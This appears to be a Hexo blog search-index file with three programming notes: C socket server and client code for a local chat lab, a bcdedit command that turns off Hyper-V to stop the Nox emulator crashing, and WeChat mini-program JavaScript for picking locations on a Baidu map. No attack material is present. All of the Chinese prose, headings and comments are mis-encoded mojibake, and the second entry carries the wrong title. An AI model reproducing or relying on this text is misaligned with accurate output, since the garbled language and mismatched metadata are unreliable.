<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Linux å®éªŒ socketç½‘ç»œç¼–ç¨‹</title>
    <url>/2020/11/05/Note/Linux%E5%AE%9E%E9%AA%8Csocket%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="Linux-å®éªŒ-socketç½‘ç»œç¼–ç¨‹"><a href="#Linux-å®éªŒ-socketç½‘ç»œç¼–ç¨‹" class="headerlink" title="Linux å®éªŒ socketç½‘ç»œç¼–ç¨‹"></a>Linux å®éªŒ socketç½‘ç»œç¼–ç¨‹</h1><h2 id="è¦æ±‚"><a href="#è¦æ±‚" class="headerlink" title="è¦æ±‚"></a>è¦æ±‚</h2><p>ç¼–å†™ä¸¤ä¸ªç¨‹åºï¼Œä¸€ä¸ªServerï¼Œä¸€ä¸ªClientï¼Œåˆ†åˆ«è¿è¡Œåœ¨ä¸¤ä¸ªshellçª—å£ï¼Œé€šè¿‡Socketå®ç°ä¸¤ä¸ªShellçª—å£çš„å³æ—¶é€šä¿¡</p>
<p>ï¼ˆå³åœ¨Açª—å£è¾“å…¥Helloï¼ŒBçª—å£ä¼šç«‹å³æ˜¾ç¤ºâ€œClientï¼šHelloâ€ã€‚Bçª—å£ä¹Ÿå¯ä»¥è¾“å…¥ä»»æ„å†…å®¹ï¼Œæ¯”å¦‚â€œNice to meet youâ€ï¼Œåœ¨Açª—å£ç«‹å³æ˜¾ç¤ºâ€œServerï¼š Nice to meet youâ€ã€‚ï¼‰<br>ï¼ˆæç¤ºï¼šæœ¬åœ°åœ°å€æ˜¯127.0.0.1ï¼Œç«¯å£æœ€å¥½10000ä»¥ä¸Šï¼Œé¿å…å æ®å…¶ä»–åº”ç”¨ç«¯å£ã€‚æ³¨æ„è®¿é—®æƒé™é—®é¢˜ã€‚ï¼‰</p>
<a id="more"></a>

<h2 id="Server-c"><a href="#Server-c" class="headerlink" title="Server.c"></a>Server.c</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;netinet&#x2F;in.h&gt;</span><br><span class="line">#include &lt;arpa&#x2F;inet.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;types.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;socket.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;wait.h&gt;</span><br><span class="line"></span><br><span class="line">#define PORT 23456</span><br><span class="line">#define SERVER_ADDR &quot;127.0.0.1&quot;</span><br><span class="line"></span><br><span class="line">int server_socket,client_socket;</span><br><span class="line"></span><br><span class="line">void func_kill(int sig)&#123;</span><br><span class="line">    &#x2F;&#x2F; printf(&quot;%d &quot;,close(server_socket));</span><br><span class="line">    &#x2F;&#x2F; printf(&quot;%d &quot;,close(client_socket));</span><br><span class="line">    close(server_socket);</span><br><span class="line">    close(client_socket);</span><br><span class="line">    signal(SIGINT,SIG_DFL);</span><br><span class="line">    exit(3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; ä¿©ä¸ªå­è¿›ç¨‹ pid1 ç”¨äºæ¥æ”¶ pid2 ç”¨äºå‘é€</span><br><span class="line">	int pid1,pid2;</span><br><span class="line">    &#x2F;&#x2F; ç­‰å¾…pidé€€å‡ºä¿¡å·</span><br><span class="line">    int pid_exit_status;</span><br><span class="line">    &#x2F;&#x2F; ç»‘å®šç«¯å£ç»“æœ ç›‘å¬ç«¯å£ç»“æœ</span><br><span class="line">    int Bind_res,Listen_res;</span><br><span class="line">    &#x2F;&#x2F; å®¢æˆ·ç«¯åœ°å€å—å¤§å°</span><br><span class="line">	socklen_t clientaddr_len;</span><br><span class="line">    &#x2F;&#x2F; æœåŠ¡ç«¯åœ°å€å— å®¢æˆ·ç«¯åœ°å€å—</span><br><span class="line">	struct sockaddr_in serveraddr,clientaddr;</span><br><span class="line">    &#x2F;&#x2F; å­˜å‚¨æ¥å—çš„æ¶ˆæ¯ å‘é€çš„æ¶ˆæ¯</span><br><span class="line">	char recv_msg[100],send_msg[100];</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F;åˆ›å»ºæœåŠ¡socket</span><br><span class="line">	server_socket &#x3D; socket(AF_INET,SOCK_STREAM,0);</span><br><span class="line">    if(server_socket&#x3D;&#x3D;-1)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(&quot;The socket is error!\n&quot;);</span><br><span class="line">		exit(0);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; è®¾ç½®ç«¯å£ç»‘å®š,å–æ¶ˆTIME_WAIT,é¿å…å ç”¨</span><br><span class="line">    struct linger ling;</span><br><span class="line">    ling.l_onoff &#x3D; 1;</span><br><span class="line">    ling.l_linger &#x3D; 0;</span><br><span class="line">    setsockopt(server_socket,SOL_SOCKET, SO_LINGER, &amp;ling, sizeof(ling));</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">    &#x2F;&#x2F; è®¾ç½®æœåŠ¡ç«¯åœ°å€</span><br><span class="line">	serveraddr.sin_family &#x3D; AF_INET; &#x2F;&#x2F;ipv4</span><br><span class="line">	serveraddr.sin_port &#x3D; htons(PORT); &#x2F;&#x2F;ç«¯å£</span><br><span class="line">    inet_aton(SERVER_ADDR,&amp;serveraddr.sin_addr); &#x2F;&#x2F;åœ°å€</span><br><span class="line">    bzero(serveraddr.sin_zero,8);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F;ç»‘å®š å’Œ ç›‘å¬ ç«¯å£</span><br><span class="line">	Bind_res  &#x3D; bind(server_socket, (struct sockaddr *)(&amp;serveraddr),sizeof(serveraddr));</span><br><span class="line">	if(Bind_res&#x3D;&#x3D;-1)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(&quot;The bind is error!\n&quot;);</span><br><span class="line">		exit(0);</span><br><span class="line">	&#125;</span><br><span class="line">	Listen_res &#x3D; listen(server_socket,2);</span><br><span class="line">	if(Listen_res&#x3D;&#x3D;-1)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(&quot;The listen is error!\n&quot;);</span><br><span class="line">		exit(0);</span><br><span class="line">	&#125;</span><br><span class="line">	printf(&quot;server start!\n&quot;);</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F; æ•è· ctrl+cä¿¡å·</span><br><span class="line">    signal(SIGINT,func_kill);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; å­è¿›ç¨‹pid1ç”¨äºå‘é€</span><br><span class="line">    pid1&#x3D; fork();</span><br><span class="line">    &#x2F;&#x2F; ç”¨äºä¸»è¿›ç¨‹é˜»å¡</span><br><span class="line">	while(1)</span><br><span class="line">	&#123;</span><br><span class="line">        if(pid1&#x3D;&#x3D;0)</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F;ç­‰å¾…è¿æ¥</span><br><span class="line">    		clientaddr_len &#x3D; sizeof(struct sockaddr_in);</span><br><span class="line">            memset(&amp;clientaddr, &#39;\0&#39;, sizeof(struct sockaddr_in));</span><br><span class="line">    		client_socket &#x3D; accept(server_socket, (struct sockaddr*)(&amp;clientaddr), &amp;clientaddr_len);</span><br><span class="line">    		if(client_socket &#x3D;&#x3D; -1)</span><br><span class="line">            &#123;</span><br><span class="line">                perror(&quot;The accept is error!\n&quot;);</span><br><span class="line">                exit(0);</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                &#x2F;&#x2F; æ‰“å°è¿æ¥çš„å­è¿›ç¨‹ipåœ°å€å’Œç«¯å£ä¿¡æ¯</span><br><span class="line">                char clntName[1024];</span><br><span class="line">                if (inet_ntop(AF_INET, &amp;clientaddr.sin_addr.s_addr, clntName, sizeof(clntName)) !&#x3D; NULL) &#123;</span><br><span class="line">                    printf(&quot;connecting client ip: %s port: %d\n&quot;, clntName, ntohs(clientaddr.sin_port));</span><br><span class="line">                &#125;</span><br><span class="line">                else</span><br><span class="line">                &#123;</span><br><span class="line">                    printf(&quot;client address get failed\n&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">       		printf(&quot;client connected success!\n&quot;);</span><br><span class="line">            &#x2F;&#x2F; pid2 ç”¨äºæ¥æ”¶</span><br><span class="line">            pid2&#x3D;fork();</span><br><span class="line">            if(pid2&#x3D;&#x3D;0)</span><br><span class="line">        	&#123;</span><br><span class="line">                &#x2F;&#x2F; pid2 é˜»å¡</span><br><span class="line">                while (1)</span><br><span class="line">                &#123;</span><br><span class="line">                    &#x2F;&#x2F; å½“å­è¿›ç¨‹pid1æ£€æµ‹åˆ°clientæ–­å¼€è¿æ¥å,åŠæ—¶é€€å‡ºå­è¿›ç¨‹pid2,å…³é—­socket</span><br><span class="line">                    signal(SIGHUP, func_kill);</span><br><span class="line">                    fgets(send_msg, sizeof(send_msg), stdin);</span><br><span class="line">    			    send(client_socket, send_msg, sizeof(send_msg), 0);</span><br><span class="line">                &#125;</span><br><span class="line">        	&#125;else&#123;</span><br><span class="line">                &#x2F;&#x2F; pid1 é˜»å¡</span><br><span class="line">                while (1)</span><br><span class="line">                &#123;	</span><br><span class="line">                	int result &#x3D; recv(client_socket,recv_msg, sizeof(recv_msg), 0);</span><br><span class="line">        			&#x2F;&#x2F; å­è¿›ç¨‹pid1æ£€æµ‹åˆ°clientæ–­å¼€è¿æ¥</span><br><span class="line">                    if (result &lt;&#x3D; 0)</span><br><span class="line">                    &#123;</span><br><span class="line">                        printf(&quot;client connect close\n&quot;);</span><br><span class="line">                        close(client_socket);</span><br><span class="line">                        kill(pid2,SIGHUP);</span><br><span class="line">                        break;</span><br><span class="line">                    &#125;</span><br><span class="line">                    &#x2F;&#x2F; æ­£å¸¸è¿æ¥</span><br><span class="line">                    printf(&quot;Client:%s&quot;,recv_msg);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F; é˜»å¡çˆ¶è¿›ç¨‹,pid1é€€å‡ºäº†å°±æŠŠçˆ¶è¿›ç¨‹ä¹Ÿé€€å‡º</span><br><span class="line">            int exit_pid &#x3D; wait(&amp;pid_exit_status);</span><br><span class="line">            if (exit_pid &#x3D;&#x3D; pid1)</span><br><span class="line">            &#123;</span><br><span class="line">                &#x2F;&#x2F; printf(&quot;paraent process quit!\n&quot;);</span><br><span class="line">                close(server_socket);</span><br><span class="line">                close(client_socket);  </span><br><span class="line">                exit(0);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Client-c"><a href="#Client-c" class="headerlink" title="Client.c"></a>Client.c</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;netinet&#x2F;in.h&gt;</span><br><span class="line">#include &lt;arpa&#x2F;inet.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;socket.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;types.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;wait.h&gt;</span><br><span class="line"></span><br><span class="line">#define PORT 23456</span><br><span class="line">#define SERVER_ADDR &quot;127.0.0.1&quot;</span><br><span class="line"></span><br><span class="line">int server_socket,client_socket;</span><br><span class="line"></span><br><span class="line">void func_kill(int sig)&#123;</span><br><span class="line">    close(server_socket);</span><br><span class="line">    close(client_socket); </span><br><span class="line">    signal(SIGINT,SIG_DFL);</span><br><span class="line">    exit(3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; ä¿©ä¸ªå­è¿›ç¨‹ pid1 ç”¨äºæ¥æ”¶ pid2 ç”¨äºå‘é€</span><br><span class="line">	int pid1,pid2;</span><br><span class="line">    &#x2F;&#x2F; ç­‰å¾…pidé€€å‡ºä¿¡å·</span><br><span class="line">    int pid_exit_status;</span><br><span class="line">    &#x2F;&#x2F; æœåŠ¡ç«¯åœ°å€</span><br><span class="line">	struct sockaddr_in serveraddr;</span><br><span class="line">	char recv_msg[100],send_msg[100];</span><br><span class="line">	&#x2F;&#x2F;åˆ›å»ºsocket</span><br><span class="line">	server_socket &#x3D; socket(AF_INET,SOCK_STREAM,0); </span><br><span class="line">	if(server_socket&#x3D;&#x3D;-1)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(&quot;The socket is error!\n&quot;);</span><br><span class="line">		exit(0);</span><br><span class="line">	&#125;</span><br><span class="line">    &#x2F;&#x2F; è®¾ç½®ç«¯å£ç»‘å®š,å–æ¶ˆTIME_WAIT,é¿å…å ç”¨</span><br><span class="line">    struct linger ling;</span><br><span class="line">    ling.l_onoff &#x3D; 1;</span><br><span class="line">    ling.l_linger &#x3D; 0;</span><br><span class="line">    setsockopt(server_socket,SOL_SOCKET, SO_LINGER, &amp;ling, sizeof(ling));</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; è®¾ç½®æœåŠ¡ç«¯åœ°å€</span><br><span class="line">	serveraddr.sin_family &#x3D; AF_INET;</span><br><span class="line">	serveraddr.sin_port &#x3D; htons(PORT); </span><br><span class="line">    inet_aton(SERVER_ADDR,&amp;serveraddr.sin_addr);</span><br><span class="line">    bzero(serveraddr.sin_zero,8);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F;è¿æ¥socket</span><br><span class="line">	client_socket  &#x3D; connect(server_socket, (struct sockaddr *)(&amp;serveraddr),sizeof(serveraddr));</span><br><span class="line">	if(client_socket&#x3D;&#x3D;-1)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(&quot;The connect is error!\n&quot;);</span><br><span class="line">		exit(0);</span><br><span class="line">	&#125;</span><br><span class="line">    printf(&quot;server connect successï¼\n&quot;);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; æ•è· ctrl+cä¿¡å·</span><br><span class="line">    signal(SIGINT,func_kill);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; å­è¿›ç¨‹pid1ç”¨äºå‘é€</span><br><span class="line">    pid1&#x3D;fork();</span><br><span class="line">    &#x2F;&#x2F; ä¸»è¿›ç¨‹é˜»å¡</span><br><span class="line">	while(1)</span><br><span class="line">	&#123;</span><br><span class="line">        if (pid1&#x3D;&#x3D;0)</span><br><span class="line">        &#123;  </span><br><span class="line">            &#x2F;&#x2F; å­è¿›ç¨‹pid2 ç”¨äºå‘é€</span><br><span class="line">            pid2&#x3D;fork();</span><br><span class="line">            if(pid2&#x3D;&#x3D;0)</span><br><span class="line">        	&#123;</span><br><span class="line">                &#x2F;&#x2F; pid2é˜»å¡</span><br><span class="line">                while (1)</span><br><span class="line">                &#123;</span><br><span class="line">                    signal(SIGHUP,func_kill);</span><br><span class="line">                    fgets(send_msg,sizeof(send_msg),stdin);</span><br><span class="line">    			    send(server_socket,send_msg,sizeof(send_msg),0);</span><br><span class="line">                &#125;</span><br><span class="line">        	&#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                &#x2F;&#x2F; pid1é˜»å¡</span><br><span class="line">                while (1)</span><br><span class="line">                &#123;</span><br><span class="line">                    int result &#x3D; recv(server_socket,recv_msg,sizeof(recv_msg),0);</span><br><span class="line">            		if (result&lt;&#x3D;0)</span><br><span class="line">                    &#123;</span><br><span class="line">                        printf(&quot;server close\n&quot;);</span><br><span class="line">                        close(server_socket);</span><br><span class="line">                        close(client_socket); </span><br><span class="line">                        &#x2F;&#x2F; ä¸æœåŠ¡å™¨æ–­å¼€è¿æ¥,é€šçŸ¥pid2é€€å‡º,å…³é—­socket</span><br><span class="line">                        kill(pid2,SIGHUP);</span><br><span class="line">                        exit(1);</span><br><span class="line">                    &#125;</span><br><span class="line">                    printf(&quot;Server:%s&quot;,recv_msg);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F; é˜»å¡çˆ¶è¿›ç¨‹,pid1é€€å‡ºäº†å°±æŠŠçˆ¶è¿›ç¨‹ä¹Ÿé€€å‡º</span><br><span class="line">            int exit_pid &#x3D; wait(&amp;pid_exit_status);</span><br><span class="line">            if (exit_pid&#x3D;&#x3D;pid1)</span><br><span class="line">            &#123;</span><br><span class="line">                &#x2F;&#x2F; printf(&quot;paraent process quit!\n&quot;);</span><br><span class="line">                close(server_socket);</span><br><span class="line">                close(client_socket);  </span><br><span class="line">                exit(0);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="è¿è¡Œç»“æœ"><a href="#è¿è¡Œç»“æœ" class="headerlink" title="è¿è¡Œç»“æœ"></a>è¿è¡Œç»“æœ</h2><p><a href="https://blogjpg.yanmy.top/blog/20201105201755.png"><img src="https://blogjpg.yanmy.top/blog/20201105201755.png" alt="image-20201105201748025"></a></p>
]]></content>
      <categories>
        <category>Note</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>Linux</tag>
        <tag>socket</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux å®éªŒ socketç½‘ç»œç¼–ç¨‹</title>
    <url>/2020/11/05/Note/%E5%A4%9C%E7%A5%9E%E5%AE%89%E5%8D%93%E6%A8%A1%E6%8B%9F%E5%99%A8%E6%89%93%E5%BC%80Windows%E7%BB%BF%E5%B1%8Fbug/</url>
    <content><![CDATA[<h1 id="å¤œç¥æ¨¡æ‹Ÿå™¨æ‰“å¼€åWindowsç»¿å±"><a href="#å¤œç¥æ¨¡æ‹Ÿå™¨æ‰“å¼€åWindowsç»¿å±" class="headerlink" title="å¤œç¥æ¨¡æ‹Ÿå™¨æ‰“å¼€åWindowsç»¿å±"></a>å¤œç¥æ¨¡æ‹Ÿå™¨æ‰“å¼€åWindowsç»¿å±</h1><p>è¿™è´§æ²¡æœ‰åƒvmwareä¸€æ ·çš„å¼‚å¸¸å¤„ç†ï¼Œä½†æ˜¯å…¶æ¨¡æ‹Ÿå™¨è¿è¡Œç¯å¢ƒæ˜¯å’Œvmwareå·®ä¸å¤šçš„è™šæ‹Ÿæœº,å¦‚æœWindowså¼€äº†wsl,å°†ä¼šå’Œwslçš„hype-Vå†²çª,å¯¼è‡´ç³»ç»Ÿå´©æºƒã€‚</p>
<a id="more"></a>

<p>è§£å†³åŠæ³•ï¼š</p>
<ul>
<li>é€šè¿‡å‘½ä»¤å…³é—­Hyper-Vï¼ˆæ§åˆ¶é¢æ¿å…³é—­Hyper-Vèµ·ä¸åˆ°å†³å®šæ€§ä½œç”¨ï¼Œè¦å½»åº•å…³é—­Hyper-Vï¼‰</li>
<li>ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡ŒWindows Powershell (ç®¡ç†å‘˜)ï¼ˆWindowsé”®+Xï¼‰</li>
<li>è¿è¡Œä¸‹é¢å‘½ä»¤å¹¶é‡å¯ç”µè„‘ï¼š</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#å…³é—­hype-V</span><br><span class="line">bcdedit &#x2F;set hypervisorlaunchtype off</span><br></pre></td></tr></table></figure>
<p>å†æ¬¡æ‰“å¼€æ¨¡æ‹Ÿå™¨å°±ä¸ä¼šç»¿å±äº†ã€‚</p>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Note</tag>
      </tags>
  </entry>
  <entry>
    <title>å¾®ä¿¡å°ç¨‹åºç™¾åº¦åœ°å›¾APIç§»åŠ¨é€‰ç‚¹</title>
    <url>/2020/11/05/Note/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%99%BE%E5%BA%A6%E5%9C%B0%E5%9B%BEapi%E7%A7%BB%E5%8A%A8%E9%80%89%E7%82%B9/</url>
    <content><![CDATA[<h1 id="å¾®ä¿¡å°ç¨‹åºç™¾åº¦åœ°å›¾APIç§»åŠ¨é€‰ç‚¹"><a href="#å¾®ä¿¡å°ç¨‹åºç™¾åº¦åœ°å›¾APIç§»åŠ¨é€‰ç‚¹" class="headerlink" title="å¾®ä¿¡å°ç¨‹åºç™¾åº¦åœ°å›¾APIç§»åŠ¨é€‰ç‚¹"></a>å¾®ä¿¡å°ç¨‹åºç™¾åº¦åœ°å›¾APIç§»åŠ¨é€‰ç‚¹</h1><p>å› ä¸ºä¸šåŠ¡éœ€è¦ä½¿ç”¨ç™¾åº¦åœ°å›¾APIï¼Œå‚è€ƒä¸€ä½å¤§ä½¬ç¼–å†™è…¾è®¯APIçš„æ€è·¯å’Œæ–¹æ³•ï¼Œæ”¹é€ æˆç™¾åº¦åœ°å›¾APIç§»åŠ¨é€‰ç‚¹ã€‚</p>
<a id="more"></a>

<h2 id="æ€è·¯ï¼š"><a href="#æ€è·¯ï¼š" class="headerlink" title="æ€è·¯ï¼š"></a>æ€è·¯ï¼š</h2><p>wxmlå‰ç«¯éƒ¨åˆ†å°±ä¸æ”¹äº†ï¼Œç”¨ç”¨å¤§ä½¬çš„ã€‚</p>
<p>å¾®ä¿¡åœ°å›¾APIè·å–å½“å‰ä½ç½®ç»çº¬åº¦ä¿¡æ¯-&gt;ç™¾åº¦åœ°å›¾APIé€†åœ°å€è§£ææ–¹æ³•,è·å–å½“å‰ä½ç½®åç§°,çœå¸‚åŒºç­‰ä¿¡æ¯-&gt;setData</p>
<p>mapChangeå‡½æ•°ç›‘å¬åœ°å›¾ç§»åŠ¨-&gt;è®¾ç½®ä¸€ä¸ªå®šæ—¶å™¨è¾¾åˆ°è½®è¯¢çš„ç›®çš„ï¼Œè®¾ç½®isGetå‚æ•°åˆ¤æ–­onLoadä¸­çš„wx.getlocationæ˜¯å¦æ‰§è¡Œå®Œã€‚-&gt;nearby_searchä»¥å½“å‰çš„åœ°å€åç§°ä¸ºæœç´¢å…³é”®å­—,å¸¦ä¸Šç»çº¬åº¦è¿›è¡ŒPOIæ£€ç´¢è·å–é™„è¿‘åœ°å€åˆ—è¡¨</p>
<p><strong>æ³¨æ„ï¼š</strong>é¡µé¢åˆå§‹åŒ–æ—¶ä¼šå› ä¸ºscaleæ”¹å˜è§¦å‘ä¸€æ¬¡mapChangeå‡½æ•°ï¼Œç”±äºJSå•çº¿ç¨‹çš„ç‰¹æ€§ï¼Œé¡µé¢åˆå§‹åŒ–ä¸pageåˆå§‹åŒ–æ—¶åŒæ—¶è¿›è¡Œçš„ï¼Œå¦‚æœå…ˆæ‰§è¡Œwx.getlocationé‚£æ²¡æœ‰é—®é¢˜ï¼Œæ‰§è¡Œå®Œç»™ç»çº¬åº¦èµ‹å€¼äº†ï¼ŒmapChangeå¯ä»¥æ­£å¸¸æ‰§è¡Œï¼Œå¦‚æœmapChangeå…ˆæ‰§è¡Œï¼Œé‚£ä¹ˆæ­¤æ—¶ç»çº¬åº¦æ²¡æœ‰åˆå§‹å€¼ä¸ºç©ºï¼ŒmapChangeè¿”å›çš„ç»çº¬åº¦ä¿¡æ¯ä¹Ÿä¸ºç©ºï¼Œå¯¼è‡´è·å–é™„è¿‘åœ°å€ä¿¡æ¯ä¹Ÿä¸ºç©ºã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨getLocationä¸­ä¹Ÿæ‰§è¡Œä¸€æ¬¡è·å–é™„è¿‘åœ°å€ä¿¡æ¯çš„å‡½æ•°ï¼Œä½†æ˜¯è¿™æ ·ä¼šå¤šè°ƒç”¨ä¸€æ¬¡APIï¼Œè°ƒç”¨APIè¿˜æ˜¯æŒºè€—æ—¶ã€‚</p>
<p>getsuggestæ ¹æ®ç”¨æˆ·åœ¨è¾“å…¥æ¡†è¾“å…¥çš„å…³é”®å­—è¿›è¡ŒPOIçƒ­è¯æ£€ç´¢ï¼Œæœç´¢å½“å‰åŸå¸‚çš„çƒ­è¯åˆ—è¡¨ã€‚</p>
<p>è¿™ä¸‰ä¸ªæ˜¯ä¸»è¦åŠŸèƒ½ï¼Œå…¶ä»–çš„å…³äºé€‰æ‹©çœå¸‚åŒºä¸‰çº§è”åŠ¨çš„éƒ¨åˆ†ï¼Œç”±äºç™¾åº¦åœ°å›¾APIæ²¡æœ‰æä¾›å®Œæ•´çš„çœå¸‚åŒºå¿åˆ—è¡¨ï¼ˆå¯èƒ½æœ‰æ˜¯æˆ‘æ²¡æ‰¾åˆ°ï¼‰ï¼Œæˆ‘ä¹Ÿæ‡’å¾—å°è£…äº†ï¼Œå°±é˜‰å‰²æ‰äº†ã€‚</p>
<h2 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h2><p>è´´ä¸€ä¸‹å…³é”®çš„JSéƒ¨åˆ†çš„ä»£ç ï¼Œè¯¦ç»†ä»£ç æŸ¥çœ‹Githubï¼Œè®°å¾—åœ¨app.jså¡«å†™çš„ä½ çš„ç™¾åº¦åœ°å›¾è°ƒç”¨å¯†åŒ™ak</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import bmap from &#39;..&#x2F;..&#x2F;utils&#x2F;bmap-wx&#39;;</span><br><span class="line">import &#39;..&#x2F;..&#x2F;utils&#x2F;util&#39;</span><br><span class="line">let app &#x3D; getApp();</span><br><span class="line">let BMap &#x3D; new bmap.BMapWX(&#123;</span><br><span class="line">  ak: app.globalData.ak,</span><br><span class="line">&#125;);</span><br><span class="line">Page(&#123;</span><br><span class="line">  data: &#123;</span><br><span class="line">    addListShow: false,</span><br><span class="line">    addressName: &#39;&#39;,</span><br><span class="line">    currentRegion: &#123;</span><br><span class="line">      province: &#39;é€‰æ‹©åŸå¸‚&#39;,</span><br><span class="line">      city: &#39;é€‰æ‹©åŸå¸‚&#39;,</span><br><span class="line">      district: &#39;é€‰æ‹©åŸå¸‚&#39;,</span><br><span class="line">    &#125;,</span><br><span class="line">    isGet: false,</span><br><span class="line">    latitude: &#39;&#39;,</span><br><span class="line">    longitude: &#39;&#39;,</span><br><span class="line">    centerData: &#123;&#125;,</span><br><span class="line">    nearList: [],</span><br><span class="line">    selectedId: 0,</span><br><span class="line">  &#125;,</span><br><span class="line">  onLoad: function () &#123;</span><br><span class="line">    let that &#x3D; this;</span><br><span class="line">    let fail &#x3D; function (data) &#123;</span><br><span class="line">      console.log(data)</span><br><span class="line">    &#125;;</span><br><span class="line">    let success &#x3D; function (data) &#123;</span><br><span class="line">      &#x2F;&#x2F; console.log(data);</span><br><span class="line">      let wxMarkerData &#x3D; data.wxMarkerData;</span><br><span class="line">      that.setData(&#123;</span><br><span class="line">        isGet: true,</span><br><span class="line">        addressName: wxMarkerData[0].address,</span><br><span class="line">        currentRegion: data.originalData.result.addressComponent,</span><br><span class="line">        centerData: wxMarkerData,</span><br><span class="line">        latitude: wxMarkerData[0].latitude,</span><br><span class="line">        longitude: wxMarkerData[0].longitude</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    that.mapCtx &#x3D; wx.createMapContext(&#39;myMap&#39;)</span><br><span class="line">    &#x2F;&#x2F;å¾®ä¿¡APIå®šä½,è·å–å½“å‰ä½ç½®ç»çº¬åº¦</span><br><span class="line">    wx.getLocation(&#123;</span><br><span class="line">      type: &#39;wgs84&#39;,</span><br><span class="line">      success(res) &#123;</span><br><span class="line">        &#x2F;&#x2F;console.log(res)</span><br><span class="line">        BMap.regeocoding(&#123;</span><br><span class="line">          location: res.latitude + &#39;,&#39; + res.longitude,</span><br><span class="line">          fail: fail,</span><br><span class="line">          success: success,</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;,</span><br><span class="line">      fail(err) &#123;</span><br><span class="line">        &#x2F;&#x2F;console.log(err)</span><br><span class="line">        wx.hideLoading(&#123;&#125;);</span><br><span class="line">        wx.showToast(&#123;</span><br><span class="line">          title: &#39;å®šä½å¤±è´¥&#39;,</span><br><span class="line">          icon: &#39;none&#39;,</span><br><span class="line">          duration: 1500</span><br><span class="line">        &#125;)</span><br><span class="line">        setTimeout(function () &#123;</span><br><span class="line">          wx.navigateBack(&#123;</span><br><span class="line">            delta: 1</span><br><span class="line">          &#125;)</span><br><span class="line">        &#125;, 1500)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;,</span><br><span class="line">  onReady: function () &#123;</span><br><span class="line"></span><br><span class="line">  &#125;,</span><br><span class="line">  &#x2F;&#x2F;ç›‘å¬æ‹–åŠ¨åœ°å›¾ï¼Œæ‹–åŠ¨ç»“æŸæ ¹æ®ä¸­å¿ƒç‚¹æ›´æ–°é¡µé¢</span><br><span class="line">  mapChange: function (e) &#123;</span><br><span class="line">    let that &#x3D; this;</span><br><span class="line">    let fail &#x3D; function (data) &#123;</span><br><span class="line">      console.log(data)</span><br><span class="line">    &#125;;</span><br><span class="line">    let success &#x3D; function (data) &#123;</span><br><span class="line">      let wxMarkerData &#x3D; data.wxMarkerData[0];</span><br><span class="line">      &#x2F;&#x2F; console.log(wxMarkerData);</span><br><span class="line">      that.setData(&#123;</span><br><span class="line">        addressName: wxMarkerData.address,</span><br><span class="line">        